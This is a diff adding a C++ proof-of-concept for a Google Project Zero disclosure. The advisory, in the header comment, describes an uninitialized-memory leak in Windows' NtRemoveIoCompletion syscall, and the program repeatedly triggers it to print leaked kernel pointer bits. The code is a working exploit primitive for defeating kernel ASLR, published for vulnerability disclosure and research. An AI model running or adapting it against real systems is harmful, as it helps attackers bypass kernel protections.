@@ -1,0 +1,115 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1269
+
+We have discovered that the nt!NtRemoveIoCompletion system call handler discloses 4 bytes of uninitialized pool memory to user-mode clients on 64-bit platforms.
+
+The bug manifests itself while passing the IO_STATUS_BLOCK structure back to user-mode. The structure is defined as follows:
+
+--- cut ---
+  typedef struct _IO_STATUS_BLOCK {
+    union {
+      NTSTATUS Status;
+      PVOID    Pointer;
+    };
+    ULONG_PTR Information;
+  } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+--- cut ---
+
+On 64-bit Windows builds, the "Pointer" field is 64 bits in width while the "Status" field is 32-bits wide. This means that if only "Status" is initialized, the upper 32 bits of "Pointer" remain garbage. This is what happens in the nt!NtSetIoCompletion syscall, which allocates a completion packet with a nested IO_STATUS_BLOCK structure (from the pools or a lookaside list), and only sets the .Status field to a user-controlled 32-bit value, leaving the remaining part of the union untouched.
+
+Furthermore, the nt!NtRemoveIoCompletion system call doesn't rewrite the structure to only pass the relevant data back to user-mode, but copies it in its entirety, thus disclosing the uninitialized 32 bits of memory to the ring-3 client. The attached proof-of-concept program illustrates the problem by triggering the vulnerability in a loop, and printing out the leaked value. When run on Windows 7 x64, we're seeing various upper 32-bit portions of kernel-mode pointers:
+
+--- cut ---
+Leak: FFFFF80011111111
+Leak: FFFFF80011111111
+Leak: FFFFF80011111111
+Leak: FFFFF80011111111
+...
+Leak: FFFFF88011111111
+Leak: FFFFF88011111111
+Leak: FFFFF88011111111
+Leak: FFFFF88011111111
+...
+Leak: FFFFFA8011111111
+Leak: FFFFFA8011111111
+Leak: FFFFFA8011111111
+Leak: FFFFFA8011111111
+--- cut ---
+
+We suspect that the monotony in the nature of the disclosed value is caused by the usage of a lookaside list, and it could likely be overcome by depleting the list and forcing the kernel to fall back on regular pool allocations. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+
+The issue was discovered by James Forshaw of Google Project Zero.
+*/
+
+#include <stdio.h>
+#include <tchar.h>
+#include <Windows.h>
+#include <winternl.h>
+
+#pragma comment(lib, "ntdll.lib")
+
+extern "C" NTSTATUS __stdcall NtCreateIoCompletion(
+  PHANDLE IoCompletionHandle,
+  ACCESS_MASK DesiredAccess,
+  POBJECT_ATTRIBUTES ObjectAttributes,
+  DWORD NumberOfConcurrentThreads
+);
+
+
+extern "C" NTSTATUS __stdcall NtRemoveIoCompletion(
+  HANDLE IoCompletionHandle,
+  PUINT_PTR KeyContext,
+  PUINT_PTR ApcContext,
+  PIO_STATUS_BLOCK IoStatusBlock,
+  PLARGE_INTEGER Timeout
+);
+
+extern "C" NTSTATUS __stdcall NtSetIoCompletion(
+  HANDLE IoCompletionHandle,
+  UINT_PTR KeyContext,
+  UINT_PTR ApcContext,
+  UINT_PTR Status,
+  UINT_PTR IoStatusInformation
+);
+
+int main()
+{
+  HANDLE io_completion;
+  NTSTATUS status = NtCreateIoCompletion(&io_completion, MAXIMUM_ALLOWED, nullptr, 0);
+  if (!NT_SUCCESS(status))
+  {
+    printf("Error creation IO Completion: %08X\n", status);
+    return 1;
+  }
+
+  while (true)
+  {
+    status = NtSetIoCompletion(io_completion, 0x12345678, 0x9ABCDEF0, 0x11111111, 0x22222222);
+    if (!NT_SUCCESS(status))
+    {
+      printf("Error setting IO Completion: %08X\n", status);
+      return 1;
+    }
+
+    IO_STATUS_BLOCK io_status = {};
+    memset(&io_status, 'X', sizeof(io_status));
+
+    UINT_PTR key_ctx;
+    UINT_PTR apc_ctx;
+
+    status = NtRemoveIoCompletion(io_completion, &key_ctx, &apc_ctx, &io_status, nullptr);
+    if (!NT_SUCCESS(status))
+    {
+      printf("Error setting IO Completion: %08X\n", status);
+      return 1;
+    }
+
+    UINT_PTR p = (UINT_PTR)io_status.Pointer;
+    if ((p >> 32) != 0)
+    {
+      printf("Leak: %p\n", io_status.Pointer);
+    }
+  }
+
+  return 0;
+}
